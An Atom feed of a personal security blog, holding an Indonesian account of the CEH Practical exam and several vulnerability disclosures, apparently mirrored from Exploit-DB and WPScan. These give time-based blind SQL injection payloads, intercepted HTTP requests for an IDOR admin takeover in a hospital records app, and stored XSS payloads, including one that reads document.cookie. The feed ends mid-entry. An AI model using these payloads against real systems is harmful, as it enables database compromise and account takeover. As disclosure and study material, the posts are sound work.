<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-02-02T00:56:47+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">twseptian’s website</title><subtitle>just a simple website</subtitle><author><name>twseptian</name></author><entry><title type="html">Pengalaman Ujian Sertifikasi CEH Practical</title><link href="http://localhost:4000/penetration%20testing/ceh%20practical/ceh_practical/" rel="alternate" type="text/html" title="Pengalaman Ujian Sertifikasi CEH Practical" /><published>2022-01-16T15:19:00+07:00</published><updated>2022-01-16T15:24:26+07:00</updated><id>http://localhost:4000/penetration%20testing/ceh%20practical/ceh_practical</id><content type="html" xml:base="http://localhost:4000/penetration%20testing/ceh%20practical/ceh_practical/"><![CDATA[<p class="notice--warning">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.</p>

<h1 id="pendahuluan">Pendahuluan</h1>

<p>Ini adalah cerita pengalaman saya mengikuti ujian CEH Practical yang ingin saya bagikan kepada orang - orang yang sedang atau ingin mengambil sertifikasi CEH Practical.</p>

<p><img src="http://localhost:4000//assets/images/ceh-practical/CEH-Practical-Logo.jpg" alt="image-left" class="align-left" /></p>

<p>Kesempatan yang saya dapatkan untuk mengambil untuk mengikuti ujian sertifikasi CEH Practical, ketika membaca informasi mengenai CEH Practical Scholarship pada tahun 2020, yang memberikan harga sekitar $99 dari harga normal yaitu sekitar $550, hal tersebut membuat saya tidak menyiakan kesempatan, dengan mengikuti intruksi - intruksi dan akhirnya mendapatkan kesempatan untuk exam (scholarship) pada akhir tahun 2020 dengan diberikan code dashboard Aspen.</p>

<p>Saya tidak mengambil exam tersebut secara langsung setelah mendapatkan code Aspen, dikarenakan sedang fokus ke sertifikasi OSCP, jadi code tersebut saya simpan kemudian saya aktifkan sekitar bulan juni 2021, dan berkesempatan mengambil ujian dipenghujung akhir masa kadaluarsa untuk ujian CEH Practical tersebut.</p>

<h1 id="ceh-practical">CEH Practical</h1>

<p>Ujian CEH Practical merupakan ujian yang di-proctor atau diawasi oleh pihak penyedia seperti Aspen. Dengan jumlah soal terdiri dari 20 soal real-life scenarios, dan waktu pengerjaan selama 6 jam.</p>

<p>Berikut spesifikasi untuk CEH Practical:</p>

<ul>
  <li>Exam Title: Certified Ethical Hacker (Practical)</li>
  <li>Number of Practical Challenges: 20</li>
  <li>Duration: 6 hours</li>
  <li>Availability: Aspen – iLabs</li>
  <li>Test Format: iLabs Cyber Range</li>
  <li>Passing Score: 70%</li>
  <li>Open Book: Yes</li>
</ul>

<p>CEH Practical sangat berbeda dengan CEH yang sering kita ketahui pada umumnya, atau yang sering disebut dengan CEH ANSI yang memberikan pengalaman untuk ujian sertifikasi tersebut dengan menjawab pertanyaan multiple-choice/pilihan ganda dengan waktu/durasi penyelasaian selama 4 jam. Hal tersebut yang menjadi pembanding dengan CEH Practical, yaitu untuk CEH Practical menggunakan Aspen- iLabs yang akan memberikan kita dua mesin sistem operasi yaitu Parrot OS dan Windows 10 untuk mencari jawaban selama ujian.</p>

<p>Topik - topik yang termasuk dalam CEH Practical:</p>
<ul>
  <li>Network scanning untuk mengidentifikasikan host,port dan service yang aktif pada sebuah network/jaringan.</li>
  <li>Dapat mengidentifikasikan sistem operasi (OS),serta enumeration pada host/mesin yang aktif</li>
  <li>Melakukan proses system hacking, steganography,crypthograpy</li>
  <li>Packet Sniffing, dan mengerti mengenai deep packet inpection pada sebuah file .pcap/.pcapng</li>
  <li>Web application security, seperti SQL injection</li>
  <li>Cracking hash dan password</li>
</ul>

<p>beberapa tools yang saya gunakan sesuai dengan pengalaman saya, antara lain:</p>
<ul>
  <li>Scanning &amp; Reconnaissance: nmap</li>
  <li>Sniffing: wireshark,tcpdump</li>
  <li>Web application attacks: burp suite, owasp zap tools, sqlmap</li>
  <li>Brute-force attack dan password cracking: hydra, john the ripper</li>
  <li>Crypthography: HashCalc, md5sum, veracrypt, cryptoforge, BCTextEncoder Utility, SONAR.exe, Cryptool</li>
  <li>Steganography: open stego</li>
</ul>

<p>dan beberapa tool pendukung seperti untuk remote desktop yang ada pada linux, antara lain: remmina, xfreerdp</p>

<h1 id="persiapan-ujian">Persiapan Ujian</h1>

<p>Beberapa hal yang harus dipersiapkan untuk ujian, antara lain:</p>
<ul>
  <li>Pastikan koneksi internet anda stabil dan baik, sehingga tidak ada kendala selama mengikuti ujian, dan pengalaman saya mesin Parrot OS dan Windows 10 yang diakses dari Aspen - iLabs sangat slows.</li>
  <li>Baca dan ta’ati intruksi &amp; aturan yang diberikan oleh proctor.</li>
  <li>Persiapkan tools protocor. Pada saat saya ujian, saya menggunakan gotomeeting yang terinstall di laptop saya,kemudian proctor akan memantau kegiatan anda, melalui webcam, sharing screen, dan microphone.</li>
  <li>Menggunakan browser, seperti firefox,chrome, dikarenakan untuk mengakses iLabs wajib menggunakan browser.</li>
  <li>Silahkan persiapkan website pendukung anda, baik berupa cheatsheet yang anda sukai atau googling saja, karena hal tersebut tidak dilarang.</li>
  <li>Tidak dianjurkan berdiskusi dengan orang lain, handphone, dan juga pastikan dalam ruangan anda tidak boleh ada orang lain selain anda.</li>
  <li>Anda diberikan waktu 15 menit untuk istirahat atau ke toilet.</li>
</ul>

<p>Selama mengikuti ujian pastikan menaati aturan - aturan yang diberikan, dan pastikan butuh kesabaran yang besar ketika mengakses mesin Aspen - iLabs dan fokus pada setiap task/soal - soal.</p>

<p>Setelah selesai mengerjakan pastikan berkomunikasi terlebih dahulu dengan proctor sebelum meng-click “Submit”. Setelah proses submitting jawaban kita, hasil kelulusan akan langsung diumumkan di akun Aspen kita, dan akan diberikan hasil transcript ujian,sertifikasi pdf, badge digital, beserta logo CEH Practical.</p>

<p><a href="https://aspen.eccouncil.org/VerifyBadge?type=certification&amp;a=RjLpHlv94HwrHByLKZw02VkNYlg0sDNqTcb0UnyQ760=" class="btn btn--danger btn--large">Click this button to see verification</a></p>

<p>Terima kasih</p>

<h1 id="referensi">Referensi</h1>
<ul>
  <li><a href="https://www.eccouncil.org/programs/certified-ethical-hacker-ceh-practical/">Certified Ethical Hacker (Practical)</a></li>
  <li><a href="https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master">Guide CEH Practical Master</a></li>
  <li><a href="https://www.linkedin.com/pulse/ceh-practical-exam-review-walkthrough-ver-jul-2021-forster-chiu/">CEH Practical Exam Review and Walkthrough (ver. Jul 2021)</a></li>
  <li><a href="https://medium.com/@jonathanchelmus/c-eh-practical-exam-review-42755546c82e">“CEH Practical Exam Review”; Jon Helmus</a></li>
</ul>]]></content><author><name>twseptian</name></author><category term="Penetration Testing" /><category term="CEH Practical" /><category term="ceh" /><category term="ceh-practical" /><category term="pentestration testing" /><category term="certification" /><category term="eccouncil" /><summary type="html"><![CDATA[Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.]]></summary></entry><entry><title type="html">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)</title><link href="http://localhost:4000/exploit-db/orrsv1.0-sql-injection/" rel="alternate" type="text/html" title="Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)" /><published>2022-01-07T00:00:00+07:00</published><updated>2021-12-30T14:58:26+07:00</updated><id>http://localhost:4000/exploit-db/orrsv1.0-sql-injection</id><content type="html" xml:base="http://localhost:4000/exploit-db/orrsv1.0-sql-injection/"><![CDATA[<p>Information about vulnerability</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Exploit Title: Online Railway Reservation System 1.0 - <span class="s1">'id'</span> SQL Injection <span class="o">(</span>Unauthenticated<span class="o">)</span>
- Date: 07/01/2022
- Exploit Author: twseptian
- Vendor Homepage: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html
- Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/orrs.zip
- Version: v1.0
- Tested on: Kali Linux 2021.4,PHP 7.4.26
- Exploit-DB: https://www.exploit-db.com/exploits/50646
</code></pre></div></div>

<h2 id="sql-injection">SQL Injection</h2>
<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to it’s database. Online Railway Reservation System v1.0 is vulnerable to SQL injection via the ‘id’ parameter on the Reservation Form.</p>

<h2 id="attack-vector">Attack Vector</h2>
<p>An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.</p>

<h2 id="steps-of-reproduce">Steps of reproduce</h2>
<ul>
  <li>
    <p>Step-1: Navigate to ‘Schedule’ &gt; go to ‘Book’ or ‘Revervation Form’ page using the following URL: <code class="language-plaintext highlighter-rouge">http://localhost/orrs/?page=reserve&amp;sid=1</code></p>
  </li>
  <li>
    <p>Step-2: Put the SQL Injection payloads in ‘id’ field. In this we used time-based blind payload: <code class="language-plaintext highlighter-rouge">/orrs/?page=reserve&amp;sid=1') AND (SELECT 6842 FROM (SELECT(SLEEP(5)))UsWr) AND ('WBCm'='WBCm</code></p>
  </li>
  <li>
    <p>Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.</p>
  </li>
</ul>]]></content><author><name>twseptian</name></author><category term="Exploit-DB" /><category term="Exploit-DB" /><summary type="html"><![CDATA[Information about vulnerability - Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated) - Date: 07/01/2022 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/orrs.zip - Version: v1.0 - Tested on: Kali Linux 2021.4,PHP 7.4.26 - Exploit-DB: https://www.exploit-db.com/exploits/50646]]></summary></entry><entry><title type="html">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection</title><link href="http://localhost:4000/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="alternate" type="text/html" title="Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection" /><published>2022-01-05T00:00:00+07:00</published><updated>2022-01-05T14:58:26+07:00</updated><id>http://localhost:4000/exploit-db/ovas-v1.0-multiple-sql-injection</id><content type="html" xml:base="http://localhost:4000/exploit-db/ovas-v1.0-multiple-sql-injection/"><![CDATA[<p>Information about vulnerability</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Exploit Title: Online Veterinary Appointment System 1.0 - <span class="s1">'Multiple'</span> SQL Injection
- Date: 05/01/20222
- Exploit Author: twseptian
- Vendor Homepage: https://www.sourcecodester.com/php/15119/online-veterinary-appointment-system-using-phpoop-free-source-code.html
- Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/ovas.zip
- Version: v1.0
- Tested on: Kali Linux 2021.4
- Exploit-DB: https://www.exploit-db.com/exploits/50644
</code></pre></div></div>

<h2 id="sql-injection">SQL Injection</h2>
<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Online Veterinary Appointment System 1.0 is vulnerable to ‘Multiple’ SQL injections.</p>

<h2 id="attack-vector">Attack Vector</h2>
<p>An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.</p>

<ol>
  <li>Appointment Requests - Vulnerable Parameter(s): <code class="language-plaintext highlighter-rouge">id</code>
Steps of reproduce:
    <ul>
      <li>Step-1: On the dashboard navigate to ‘Appointment Requests’ page using the following URL: <code class="language-plaintext highlighter-rouge">http://localhost/ovas/admin/?page=appointments</code>, then go to ‘Action’ &gt; ‘View’.</li>
      <li>Step-2: Put the SQL Injection payloads in ‘id’ field. time-based blind payload : <code class="language-plaintext highlighter-rouge">page=appointments/view_details&amp;id=1' AND (SELECT 2197 FROM (SELECT(SLEEP(5)))DZwi) AND 'mQQq'='mQQq</code></li>
      <li>Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.</li>
    </ul>
  </li>
</ol>

<p><strong>Read more <a href="https://www.exploit-db.com/exploits/50644">here</a></strong></p>]]></content><author><name>twseptian</name></author><category term="Exploit-DB" /><category term="Exploit-DB" /><summary type="html"><![CDATA[Information about vulnerability - Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection - Date: 05/01/20222 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15119/online-veterinary-appointment-system-using-phpoop-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/ovas.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB: https://www.exploit-db.com/exploits/50644]]></summary></entry><entry><title type="html">Hospitals Patient Records Management System 1.0 - Account TakeOver</title><link href="http://localhost:4000/exploit-db/hprmsv1-0-idor/" rel="alternate" type="text/html" title="Hospitals Patient Records Management System 1.0 - Account TakeOver" /><published>2021-12-30T00:00:00+07:00</published><updated>2021-12-30T14:58:26+07:00</updated><id>http://localhost:4000/exploit-db/hprmsv1-0-idor</id><content type="html" xml:base="http://localhost:4000/exploit-db/hprmsv1-0-idor/"><![CDATA[<p>Information about vulnerability</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Exploit Title: Hospital<span class="s1">'s Patient Records Management System v1.0 - '</span><span class="nb">id</span><span class="s1">' Insecure direct object references (IDOR) leads to Account TakeOver
- Date: 2021-12-30
- Exploit Author: twseptian
- Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html
- Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip
- Version: v1.0
- Tested on: Kali Linux 2021.4
- Exploit-DB link: https://www.exploit-db.com/exploits/50631
</span></code></pre></div></div>

<h2 id="insecure-direct-object-references-idor">Insecure direct object references (IDOR)</h2>
<p>Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input.Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system.</p>

<h2 id="attack-vector">Attack Vector</h2>
<p>An attacker can takeover the Administrator’s account</p>

<h2 id="steps-of-reproduce">Steps of reproduce</h2>
<p>Note: in this case, we used two users, user1 as a staff with user id ‘4’, and admin as an Administrator with user id ‘1’.</p>
<ul>
  <li>Step-1: Log in to the application using user1 account,then on the dashboard navigate to ‘My Account’ <code class="language-plaintext highlighter-rouge">http://localhost/hprms/admin/?page=user</code></li>
  <li>Step-2: Modify the username,lastname and password,then let’s intercept the request using burpsuite:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /hprms/classes/Users.php?f<span class="o">=</span>save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:91.0<span class="o">)</span> Gecko/20100101 Firefox/91.0
Accept: <span class="k">*</span>/<span class="k">*</span>
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">---------------------------17632878732301879013646251239</span>
Content-Length: 806
Origin: http://localhost
Connection: close
Referer: http://localhost/hprms/admin/?page<span class="o">=</span>user
Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>32kl57ct3p8nsicsrp8dte2c50
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"id"</span>

4
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"firstname"</span>

user1
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"lastname"</span>

admin
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span>

admin1
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span>

admin1
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"img"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">""</span>
Content-Type: application/octet-stream


<span class="nt">-----------------------------17632878732301879013646251239--</span>
</code></pre></div></div>

<ul>
  <li>Step-3: Change parameter id ‘4’ to id ‘1’</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /hprms/classes/Users.php?f<span class="o">=</span>save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:91.0<span class="o">)</span> Gecko/20100101 Firefox/91.0
Accept: <span class="k">*</span>/<span class="k">*</span>
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">---------------------------17632878732301879013646251239</span>
Content-Length: 806
Origin: http://localhost
Connection: close
Referer: http://localhost/hprms/admin/?page<span class="o">=</span>user
Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>32kl57ct3p8nsicsrp8dte2c50
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"id"</span>

1
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"firstname"</span>

user1
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"lastname"</span>

admin
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span>

admin1
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span>

admin1
<span class="nt">-----------------------------17632878732301879013646251239</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"img"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">""</span>
Content-Type: application/octet-stream


<span class="nt">-----------------------------17632878732301879013646251239--</span>
</code></pre></div></div>

<ul>
  <li>step-4: Click ‘Forward’ on burpsuite. Now user1 is a Administrator.</li>
</ul>]]></content><author><name>twseptian</name></author><category term="Exploit-DB" /><category term="Exploit-DB" /><summary type="html"><![CDATA[Information about vulnerability - Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' Insecure direct object references (IDOR) leads to Account TakeOver - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50631]]></summary></entry><entry><title type="html">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)</title><link href="http://localhost:4000/exploit-db/hprmsv1.0-sql-injection/" rel="alternate" type="text/html" title="Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)" /><published>2021-12-30T00:00:00+07:00</published><updated>2021-12-30T14:58:26+07:00</updated><id>http://localhost:4000/exploit-db/hprmsv1.0-sql-injection</id><content type="html" xml:base="http://localhost:4000/exploit-db/hprmsv1.0-sql-injection/"><![CDATA[<p>Information about vulnerability</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Exploit Title: Hospital<span class="s1">'s Patient Records Management System v1.0 - '</span><span class="nb">id</span><span class="s1">' SQL Injection (Authenticated)
- Date: 2021-12-30
- Exploit Author: twseptian
- Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html
- Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip
- Version: v1.0
- Tested on: Kali Linux 2021.4
- Exploit-DB link: https://www.exploit-db.com/exploits/50630
</span></code></pre></div></div>

<h2 id="sql-injection">SQL Injection</h2>
<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Hospital’s Patient Records Management System v1.0 is vulnerable to SQL injection via the ‘id’ parameter on the patient list.</p>

<h2 id="attack-vector">Attack Vector</h2>
<p>An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.</p>

<h2 id="steps-of-reproduce">Steps of reproduce</h2>
<ul>
  <li>
    <p>Step-1: On the dashboard navigate to ‘Patient List’, then go to ‘Action’ &gt; ‘View Records’ page using the following URL: <code class="language-plaintext highlighter-rouge">http://localhost/hprms/admin/?page=patients/view_patient&amp;id=1</code></p>
  </li>
  <li>
    <p>Step-2: Put the SQL Injection payloads in ‘id’ field. time-based blind payload : <code class="language-plaintext highlighter-rouge">page=patients/view_patient&amp;id=1' AND (SELECT 2664 FROM (SELECT(SLEEP(5)))ixec) AND 'XcAY'='XcAY</code></p>
  </li>
  <li>
    <p>Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.</p>
  </li>
</ul>]]></content><author><name>twseptian</name></author><category term="Exploit-DB" /><category term="Exploit-DB" /><summary type="html"><![CDATA[Information about vulnerability - Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated) - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50630]]></summary></entry><entry><title type="html">Spring Boot Log4j - CVE-2021-44228</title><link href="http://localhost:4000/cve/CVE-2021-44228/" rel="alternate" type="text/html" title="Spring Boot Log4j - CVE-2021-44228" /><published>2021-12-13T00:00:00+07:00</published><updated>2021-12-13T14:58:26+07:00</updated><id>http://localhost:4000/cve/CVE-2021-44228</id><content type="html" xml:base="http://localhost:4000/cve/CVE-2021-44228/"><![CDATA[<h1 id="description">Description</h1>
<p>The Log4Shell vulnerability (CVE-2021-44228) ultimately is a quite simple JNDI Injection flaw, but in a really really bad place. Log4J will perform a JNDI lookup() while expanding placeholders in logging messages (or indirectly as parameters for formatted messages) - readmore <a href="https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/">PSA: Log4Shell and the current state of JNDI injection</a>.</p>

<p>For information and setup, let’s navigate to my github repository <a href="https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab">Spring Boot Log4j - CVE-2021-44228</a></p>

<h1 id="references">References</h1>
<ul>
  <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package</a></li>
  <li><a href="https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/">PSA: Log4Shell and the current state of JNDI injection</a></li>
  <li><a href="https://github.com/christophetd/log4shell-vulnerable-app">Log4Shell sample vulnerable application (CVE-2021-44228)</a></li>
  <li><del><a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a></del> <code class="language-plaintext highlighter-rouge">Update (Dec 13th): The JNDIExploit repository has been removed from GitHub</code></li>
</ul>]]></content><author><name>twseptian</name></author><category term="CVE" /><category term="CVE" /><category term="CVE-2021-44228" /><category term="Log4Shell" /><category term="Log4j" /><summary type="html"><![CDATA[Description The Log4Shell vulnerability (CVE-2021-44228) ultimately is a quite simple JNDI Injection flaw, but in a really really bad place. Log4J will perform a JNDI lookup() while expanding placeholders in logging messages (or indirectly as parameters for formatted messages) - readmore PSA: Log4Shell and the current state of JNDI injection.]]></summary></entry><entry><title type="html">Book appointment Online &amp;lt; 1.39 - Authenticated Stored Cross-Site Scripting (XSS)</title><link href="http://localhost:4000/cve/CVE-2021-24614/" rel="alternate" type="text/html" title="Book appointment Online &amp;lt; 1.39 - Authenticated Stored Cross-Site Scripting (XSS)" /><published>2021-10-01T00:00:00+07:00</published><updated>2021-10-01T14:58:26+07:00</updated><id>http://localhost:4000/cve/CVE-2021-24614</id><content type="html" xml:base="http://localhost:4000/cve/CVE-2021-24614/"><![CDATA[<h1 id="description">Description</h1>
<p>The plugin does not sanitise or escape Service Prices before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.</p>

<h1 id="proof-of-concept">Proof of Concept</h1>
<p>In the admin dashboard navigate to <code class="language-plaintext highlighter-rouge">Services &gt; Add service</code> and put the following payload in the Price (Service Params section):</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert('test')&lt;/script&gt;
</code></pre></div></div>
<p>The XSS will be triggered in the Services list <code class="language-plaintext highlighter-rouge">/wp-admin/edit.php?post_type=services</code></p>

<h1 id="timeline">Timeline</h1>
<ul>
  <li>Publicly Published : 2021-08-10 (about 1 months ago)</li>
  <li>Added : 2021-08-10 (about 1 months ago)</li>
  <li>Last Updated : 2021-08-10 (about 1 months ago)</li>
</ul>

<h1 id="links">Links</h1>
<ul>
  <li><a href="https://wpscan.com/vulnerability/e8b5c609-dc67-4dce-b6bb-7d63c0c2a014">Book appointment Online &lt; 1.39 - Authenticated Stored Cross-Site Scripting (XSS)</a></li>
  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24614">CVE-2021-24614</a></li>
</ul>]]></content><author><name>twseptian</name></author><category term="CVE" /><category term="CVE" /><summary type="html"><![CDATA[Description The plugin does not sanitise or escape Service Prices before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.]]></summary></entry><entry><title type="html">WP Courses LMS &amp;lt; 2.0.44 - Authenticated Stored XSS via Video Embed Code</title><link href="http://localhost:4000/cve/CVE-2021-24621/" rel="alternate" type="text/html" title="WP Courses LMS &amp;lt; 2.0.44 - Authenticated Stored XSS via Video Embed Code" /><published>2021-10-01T00:00:00+07:00</published><updated>2021-10-01T14:58:26+07:00</updated><id>http://localhost:4000/cve/CVE-2021-24621</id><content type="html" xml:base="http://localhost:4000/cve/CVE-2021-24621/"><![CDATA[<h1 id="description">Description</h1>
<p>The plugin does not sanitise its Video Embed Code, allowing malicious code to be injected in it by high privilege users, even when the unfiltered_html capability is disallowed, which could lead to Stored Cross-Site Scripting issues</p>

<h1 id="proof-of-concept">Proof of Concept</h1>
<p>On the dashboard, navigate to <code class="language-plaintext highlighter-rouge">WP Courses &gt; Courses &gt; Add New &gt; Video Embed Code (iframe) (in the Post settings)</code>, inject with <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> XSS payload, such as</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe src="javascript:alert(document.cookie)"&gt;&lt;/iframe&gt;;&lt;iframe src="javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29"&gt;&lt;/iframe&gt;
</code></pre></div></div>
<p>Then, click <code class="language-plaintext highlighter-rouge">Update</code>, and to trigger XSS payload, open URL path of course</p>

<h1 id="timeline">Timeline</h1>
<ul>
  <li>Publicly Published : 2021-08-16 (about 1 months ago)</li>
  <li>Added : 2021-08-16 (about 1 months ago)</li>
  <li>Last Updated : 2021-08-16 (about 1 months ago)</li>
</ul>

<h1 id="links">Links</h1>
<ul>
  <li><a href="https://wpscan.com/vulnerability/bfbb32ac-9ef9-46de-8e5e-7d6d6fb868d8">WP Courses LMS &lt; 2.0.44 - Authenticated Stored XSS via Video Embed Code</a></li>
  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24621">CVE-2021-24621</a></li>
</ul>]]></content><author><name>twseptian</name></author><category term="CVE" /><category term="CVE" /><summary type="html"><![CDATA[Description The plugin does not sanitise its Video Embed Code, allowing malicious code to be injected in it by high privilege users, even when the unfiltered_html capability is disallowed, which could lead to Stored Cross-Site Scripting issues]]></summary></entry><entry><title type="html">WP Ticket &amp;lt; 5.10.4 - Admin+ Stored Cross-Site Scripting</title><link href="http://localhost:4000/cve/CVE-2021-24622/" rel="alternate" type="text/html" title="WP Ticket &amp;lt; 5.10.4 - Admin+ Stored Cross-Site Scripting" /><published>2021-10-01T00:00:00+07:00</published><updated>2021-10-01T14:58:26+07:00</updated><id>http://localhost:4000/cve/CVE-2021-24622</id><content type="html" xml:base="http://localhost:4000/cve/CVE-2021-24622/"><![CDATA[<h1 id="description">Description</h1>
<p>The plugin does not sanitize or escape form fields before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.</p>

<h1 id="proof-of-concept">Proof of Concept</h1>
